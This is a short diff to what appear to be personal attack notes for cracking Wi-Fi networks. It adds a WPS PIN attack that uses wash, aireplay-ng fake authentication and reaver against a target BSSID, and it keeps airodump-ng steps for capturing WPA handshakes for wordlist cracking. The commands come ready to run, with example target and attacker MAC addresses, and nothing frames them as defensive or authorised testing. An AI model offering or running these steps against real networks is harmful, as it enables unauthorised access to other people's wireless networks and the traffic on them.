@@ -27,7 +27,15 @@ run: service network-manager restart
 ~# ifconfig wlan0 up
 ~# iwconfig
 
----wifi wpa/wpa2 cracking---
+-Hacking WPA&WPA2 without a Worldlist (crack WPS PIN)-
+>makesure you're in monitor mode
+(up screen)
+~# wash --interface wlan0
+~# aireplay-ng --fakeauth 30 -a C8:5A:9F:CD:15:F2(bssid target) -h C0:4A:00:2A:FF:D5(my wlan mac) wlan0
+(down screen)
+# reaver --bssid (target bssid) --channel (channel bssisd's use) --interface wlan0 -vvv --no-associate
+
+---wifi wpa/wpa2 cracking with word list---
 (scrren atas)
 ~# airodump-ng wlan0
 ~# airodump-ng --bssid D8:32:14:30:0C:B1(bssid target) --channel 3(channel target) --write wpa_handsake wlan0
